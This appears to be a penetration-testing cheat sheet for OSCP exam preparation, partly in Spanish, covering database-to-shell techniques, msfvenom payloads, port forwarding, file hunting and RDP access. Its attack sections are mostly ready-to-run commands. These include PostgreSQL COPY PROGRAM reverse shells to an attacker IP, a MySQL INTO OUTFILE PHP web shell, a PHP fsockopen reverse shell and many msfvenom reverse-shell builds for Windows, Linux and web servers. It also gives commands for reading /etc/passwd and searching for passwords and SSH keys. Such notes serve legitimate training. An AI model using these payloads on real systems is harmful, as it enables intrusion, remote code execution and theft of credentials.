Initial Access

Connect to PostgreSQL database

psql -h <IP> -p <Port> -U <User>

If password is required:

psql -h <IP> -p <Port> -U <User> -W

Basic Enumeration (VERY IMPORTANT)


\l          -- list databases
\c dbname   -- connect to database
\dt         -- list tables
\d          -- describe table
\du         -- list users/roles

Useful SQL queries:


SELECT user;
SELECT current_user;
SELECT version();

File Read (if permissions allow)


SELECT pg_read_file('/etc/passwd');

Check if superuser:


SELECT usesuper FROM pg_user WHERE usename = current_user;

RCE via COPY PROGRAM (Key technique)

This works only if the PostgreSQL user has superuser or elevated privileges.


COPY (SELECT '') TO PROGRAM 'id';

Reverse shell (direct execution)


COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1"';

Alternative Method (staged execution via file)


CREATE TABLE shell(output text);

COPY shell FROM PROGRAM 'echo "bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1" > /tmp/shell.sh';

COPY shell FROM PROGRAM 'bash /tmp/shell.sh';

When it works

  • Database user has SUPERUSER privileges OR dangerous roles enabled
  • COPY ... PROGRAM is not restricted by configuration
  • Binary execution allowed by OS permissions

When it fails

  • Role is unprivileged (most real systems)
  • copy_program is disabled
  • Restricted sandbox / managed DB environment

Common escalation path mindset


Postgres access → check roles → check file read → check COPY PROGRAM → RCE

One-line rule


If Postgres user is superuser → COPY PROGRAM = instant RCE
MySQL → File Read / Write → RCE (Web Shell)

Connect to MySQL


mysql -u root -p -h 10.10.10.10

Check user & privileges


SELECT user(), current_user();
SHOW GRANTS;

Look for FILE privilege → required for LOAD_FILE / INTO OUTFILE.

Check FILE privilege explicitly


SHOW GRANTS FOR CURRENT_USER();

You need FILE privilege to read/write local files.

Read local files (LFI via DB)


SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts');

If NULL is returned → wrong path, permission issue, or secure_file_priv restriction.

Check secure_file_priv (IMPORTANT)


SHOW VARIABLES LIKE 'secure_file_priv';

Possible outcomes:
• Empty → no restriction (best case)
• /var/lib/mysql-files/ → must write inside that directory
• NULL → FILE operations disabled

Find web root (required for RCE)


# Common Linux web roots:
 /var/www/html/
 /var/www/
 /srv/http/

# Common Windows web roots:
 C:\xampp\htdocs\
 C:\inetpub\wwwroot\

Write PHP web shell (RCE via web root)


SELECT '<?php system($_GET["cmd"]); ?>'
INTO OUTFILE '/var/www/html/shell.php';

This creates a functional web shell because the SELECT statement contains PHP code.

Requirements:
• FILE privilege enabled
• secure_file_priv allows target path
• Web server executes PHP in that directory

Alternative web shell (more stable)


SELECT '<?php system($_GET["cmd"]); ?>'
INTO OUTFILE '/var/www/html/shell.php';

Windows alternative web shell path


SELECT '<?php system($_GET["cmd"]); ?>'
INTO OUTFILE 'C:\\xampp\\htdocs\\shell.php';

Verify file creation


SELECT LOAD_FILE('/var/www/html/shell.php');

Trigger RCE


http://TARGET/shell.php?cmd=id
http://TARGET/shell.php?cmd=whoami

Upgrade to reverse shell


php -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

Listener (attacker machine)


rlwrap nc -nlvp 4444

UDF privilege check (advanced escalation path)


SELECT * FROM mysql.user;
SHOW VARIABLES LIKE 'plugin_dir';

If plugin_dir is writable + high privileges → possible UDF exploitation (lib_mysqludf_sys) → SYSTEM/root.

Common failure reasons (OSCP critical)


- secure_file_priv restricts write path
- missing FILE privilege
- wrong web root
- PHP not executed in target directory
- SELinux / AppArmor blocking writes

MSFVenom → Payloads Multi-OS (Windows / Linux / Formats / OSCP Cheatsheet)

What is MSFVenom (mental model)

MSFVenom is a payload generator that creates executable payloads for different operating systems and formats. In OSCP, the goal is not “Metasploit usage”, but generating a binary/script that executes a reverse shell.

Windows Reverse Shells

Windows 64-bit (recommended)


# Stable modern Windows payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell64.exe

✔ Use on modern Windows (Server 2016/2019/10/11) ✔ Avoids WOW64 issues ✔ Most reliable option

Windows 32-bit (legacy systems)


msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell32.exe

✔ Use only when target is old (XP / 7 / legacy apps) ✔ Not needed for modern OSCP boxes most of the time

Windows MSI (AlwaysInstallElevated / installer abuse)


msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o install.msi

✔ Used when you can execute installers ✔ Common in privilege escalation (SYSTEM via MSI execution)

Windows DLL (process injection / hijacking)


msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o payload.dll

✔ Used for DLL hijacking scenarios ✔ Often dropped into writable service folders

Windows Script Payloads


# VBS (legacy environments)
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f vbs -o shell.vbs

# ASP (IIS web servers)
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp -o shell.asp

# ASPX (modern IIS)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx -o shell.aspx

✔ Use when exploiting web uploads (IIS / legacy apps / file upload bugs)

Linux Reverse Shells

Linux 64-bit (most common)


msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o shell.elf

✔ Default Linux payload ✔ Works on most modern distros

Linux 32-bit


msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o shell32.elf

✔ Rare, but useful for old binaries or constrained environments

Web Payloads (very common in OSCP)

PHP reverse shell


msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw -o shell.php

JSP (Java web servers)


msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o shell.jsp

WAR file (Tomcat deployment)


msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war -o shell.war

✔ Upload to Tomcat → deploy → execute shell

Listener (always required)


nc -lvnp <PORT>

✔ Must match LPORT ✔ Must be reachable from victim machine

Format Selection Guide (VERY IMPORTANT)


Windows executable exploit → .exe  
Privilege escalation via installer → .msi  
Web upload (IIS) → .aspx / .asp / .vbs  
Linux exploit → .elf  
Web server (PHP) → .php  
Java apps → .jsp / .war

Architecture decision (critical OSCP rule)


Modern Windows → x64 payload  
Legacy systems → x86 payload  
Unknown system → try x64 first

Common mistakes


- Wrong architecture (x86 vs x64)
- Wrong format for web server
- LHOST not reachable (VPN / NAT issue)
- Forgetting listener before execution

OSCP mindset


Payload is just a delivery method:
The real skill is choosing the correct format based on the entry vector.

Detecting Internal Services & Port Forwarding Decision Flow

Concept

Internal services are applications running on the target machine that are bound to localhost (127.0.0.1) or private network interfaces. These services are not directly accessible from the attacker machine and require tunneling (port forwarding) or pivoting to interact with them.

How to Identify Internal Services

1. Check listening ports


ss -tulnp
netstat -tulnp

Look for bindings like:


127.0.0.1:8080
127.0.0.1:3000
127.0.0.1:5432

If a service is bound to 127.0.0.1, it is only accessible locally from the target machine.

2. Identify running processes


ps aux

Look for suspicious or interesting services:

  • python / flask / django apps
  • node / express servers
  • java jar applications
  • databases (postgres, redis, mysql)

3. Check service configurations


cat /etc/nginx/sites-enabled/*
cat /etc/apache2/ports.conf

Danger signs:


listen 127.0.0.1:8080;

This means the web service is explicitly restricted to localhost.

4. Check local web access


curl http://127.0.0.1:8080
curl http://localhost:3000

If this works locally but not externally, the service is internal-only.

5. Check network interfaces


ip a
ip route

Look for internal networks like:


10.10.10.0/24
172.16.0.0/16
192.168.0.0/24

Decision: When to use Port Forwarding

  • Service is bound to 127.0.0.1
  • Service is only reachable from curl localhost
  • Service does not appear in external nmap scan
  • You find internal-only web panels or APIs

Port Forwarding Example (SSH -L)


ssh -L 8080:127.0.0.1:8080 user@target

Then access locally:


http://127.0.0.1:8080

Mental Model


If service is on 127.0.0.1 → it exists, but is hidden from the outside world
Port forwarding = bringing it to your machine

Common Real Targets

  • Admin dashboards (localhost only)
  • Databases (PostgreSQL, MySQL, Redis)
  • Internal APIs
  • Development servers (Flask / Node debug panels)

OSCP Rule


If service is reachable only via localhost → treat it as a high-value pivot target
File Hunting → Búsqueda de Ficheros (Linux y Windows)

Buscar archivos en Linux


# Buscar por nombre exacto
find / -type f -name "flag.txt" 2>/dev/null

# Buscar sin distinción de mayúsculas/minúsculas
find / -type f -iname "password"

# Buscar archivos de configuración
find / -type f -iname "*.conf"

# Buscar dentro de archivos (contenido)
grep -R "password" /etc 2>/dev/null

# Buscar archivos recientes (últimas 24h)
find / -type f -mtime -1 2>/dev/null

Buscar archivos en Windows


# Buscar archivos por nombre (CMD)
dir C:\ /s /b | findstr "password"

# Buscar archivos por nombre (PowerShell - RECOMENDADO)
Get-ChildItem C:\ -Recurse -ErrorAction SilentlyContinue -Filter "*password*"

# Buscar archivos con extensión específica
dir C:\ /s /b | findstr ".config"

# Buscar contenido dentro de archivos
Select-String -Path C:\* -Pattern "password" -Recurse -ErrorAction SilentlyContinue

# Buscar web roots (muy común en OSCP)
dir C:\inetpub\wwwroot\ /s

# Unattended install files (muy importante)
dir C:\Windows\Panther\ /s

Archivos sensibles comunes (OSCP)

• Archivos de configuración (config, .ini, .conf)
• Web config (web.config en IIS)
• Backups (.bak, .old, .zip)
• Unattended install files (Unattend.xml)
• Claves SSH (id_rsa, private keys)
• Variables de entorno (.env)

Errores comunes en file hunting


- No usar PowerShell cuando está disponible (mejor que CMD)
- No filtrar correctamente (demasiado ruido)
- Ignorar directorios de usuarios (C:\Users\)
- Ignorar directorios temporales (C:\Users\Public, C:\Temp, /tmp)
Python Virtual Environments → venv Management (OSCP Toolkit)

Create and activate a virtual environment (venv)


# Create a virtual environment
python3 -m venv venv

# Activate virtual environment (Linux)
source venv/bin/activate

# Confirm activation (you should see (venv) in the prompt)

Install dependencies inside venv


# Install requirements file
pip install -r requirements.txt

# Install packages manually
pip install impacket ldap3

# List installed packages
pip list

Run tools inside the venv


# Run Python script inside environment
python3 targetedKerberoast.py -h

# Example Kerberoast tool usage
python3 targetedKerberoast.py -v \
-d shadow.gate \
-u jtrueblood \
-p blood_brothers \
--dc-ip 10.1.200.178

Deactivate the virtual environment


# Exit venv and return to system Python
deactivate

Common Kali error (PEP 668 - externally managed environment)


# ERROR: externally-managed-environment
→ Correct solution (DO NOT break system Python):

✔ Use venv:
python3 -m venv venv
source venv/bin/activate

✔ Alternative (not recommended):
pip install --break-system-packages

 Avoid installing Python packages globally on modern Kali

OSCP best practices


- Always use a venv for external Python tools
- Keep one venv per project or target
- Do not mix system Impacket with pip-installed versions
- Install dependencies only inside isolated environments
- Document requirements if modifications are made

Common mistakes


- Running pip install globally (blocked on Kali)
- Forgetting to activate venv before running tools
- Mixing multiple projects inside the same venv
- Missing dependencies inside the environment

OSCP tip

Always use venv + Impacket + custom tools to avoid dependency conflicts. In OSCP labs and exams, this prevents setup issues and saves time during exploitation.

xfreerdp Toolkit (OSCP - RDP Access & Troubleshooting)

Basic RDP connection (standard usage)


# Basic login
xfreerdp /v:192.168.219.46 /u:username /p:password

# Specify domain if needed
xfreerdp /v:192.168.219.46 /u:username /p:password /d:DOMAIN

Bypass certificate issues (very common in OSCP labs)


# Ignore certificate warnings
xfreerdp /v:192.168.219.46 /u:username /p:password /cert:ignore

Fix NLA / TLS connection errors


# Force RDP security layer (fixes TLS handshake issues)
xfreerdp /v:192.168.219.46 /u:username /p:password /sec:rdp

# Alternative safe mode
xfreerdp /v:192.168.219.46 /u:username /p:password /auth-only

Clipboard & usability options (OSCP quality-of-life)


# Enable clipboard sharing
xfreerdp /v:192.168.219.46 /u:username /p:password +clipboard

# Full desktop experience
xfreerdp /v:192.168.219.46 /u:username /p:password /cert:ignore +clipboard /dynamic-resolution

Common error fixes (OSCP troubleshooting)


# TLS handshake failed
→ fix:
xfreerdp /v:IP /u:user /p:pass /sec:rdp /cert:ignore

# CredSSP / NLA issues
→ try:
xfreerdp /v:IP /u:user /p:pass /sec:rdp

# Authentication failed
→ verify:
- username format
- password correctness
- domain presence

Credential format variations


# Local user
/user:offsec

# Domain user
/user:DOMAIN\\offsec

# UPN format
/user:offsec@domain.local

File transfer alternatives (RDP labs)


# Drive mount (Linux → Windows)
xfreerdp /v:IP /u:user /p:pass /drive:share,/home/kali/share

# Clipboard paste payloads
+clipboard

OSCP methodology tip

Always start with /cert:ignore and basic /sec:rdp when facing connection errors. If TLS fails, downgrade the security layer. RDP is usually the final step after credential discovery via SMB, FTP, or web services.
